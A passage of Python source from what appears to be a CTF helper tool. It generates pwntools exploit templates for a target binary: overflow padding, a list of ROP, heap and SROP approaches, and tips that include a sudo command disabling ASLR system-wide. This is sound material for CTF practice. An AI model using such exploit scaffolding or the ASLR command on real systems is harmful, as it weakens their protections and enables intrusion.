p.sendline(payload2)

p.interactive()
'''
        else:
            # Advanced: provide a template
            exploit = f'''
#!/usr/bin/env python3
# auto_pwn exploit - advanced template for {basename}
from pwn import *

context.arch = '{ctx_arch}'
context.log_level = 'debug'

{connect_code}
elf = ELF('./{basename}')
# libc = ELF('./libc.so.6')

offset = {offset_val}

# === Advanced exploitation ===
# This binary has strong protections.
# Possible approaches:
#   1. Format string to leak canary/PIE/libc
#   2. Heap exploitation
#   3. ret2csu for gadget control
#   4. SROP (sigreturn-oriented programming)
#
# Step 1: Leak addresses
# Step 2: Build ROP chain
# Step 3: Trigger exploit

payload = b'A' * offset
# TODO: build your exploit chain

p.recvuntil(b'> ')  # TODO: adjust
p.sendline(payload)

p.interactive()
'''

        lines.append(f"\n{'=' * 60}")
        lines.append("  Auto-generated Exploit Script")
        lines.append(f"{'=' * 60}")
        lines.append(exploit)

        # 10. 补充建议
        lines.append(f"{'=' * 60}")
        lines.append("  Additional Tips")
        lines.append(f"{'=' * 60}")
        lines.append("  - Verify offset: ./ctf-tool pwn generate_pattern 200")
        lines.append("  - Find offset:   ./ctf-tool pwn find_pattern_offset 0x41414141")
        lines.append(f"  - Find gadgets:  ./ctf-tool pwn find_rop_gadgets {basename}")
        lines.append(f"  - Shellcode:     ./ctf-tool pwn shellcode_template linux {arch_str}")
        lines.append(f"  - GDB debug:     gdb -q ./{basename}")
        if not no_pie:
            lines.append("  - Disable ASLR:  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space")

        return "\n".join(lines)
